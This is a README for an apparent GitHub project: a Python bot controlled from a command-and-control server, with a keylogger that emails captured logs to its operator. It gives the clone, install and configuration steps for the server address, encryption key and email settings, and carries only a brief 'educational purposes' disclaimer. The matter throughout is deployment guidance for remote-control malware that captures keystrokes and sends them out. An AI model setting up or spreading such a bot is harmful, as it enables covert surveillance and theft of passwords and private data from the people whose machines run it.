# a python-based bot with several features
ATTENTION: The code provided is for educational purposes and should only be used on your own systems.

# Setup
## Download the content from the repository
`git clone https://github.com/rysecx/python-bot.git && cd python-bot`

## C&C server setup
Move ccserver.py to your binary folder:
`sudo mv ccserver.py /usr/bin/ccserver`
By starting the server for the first time the program will guide you threw the configuration:
`ccserver`

## Bot setup
To setup the bot you have to open bot.py in an editor of your choice.
In line 20 to 22 the server address, port and encryption key are defined which are essential for a communication between them.
Be sure they are the same as you configured in the C&C server setup.
If you want use the keylogger feature there has to be set three values in line 55 to 57 which are important because the keylogger feature will send you an email from time to time with an updated log file.
If you saved all current changes the bot can be started: `python3 bot.py`

## Important information
The project is still under development and more features will be released in future.
Bot and C&C server both require Python 3 to be installed as for encryption the cryptography module.
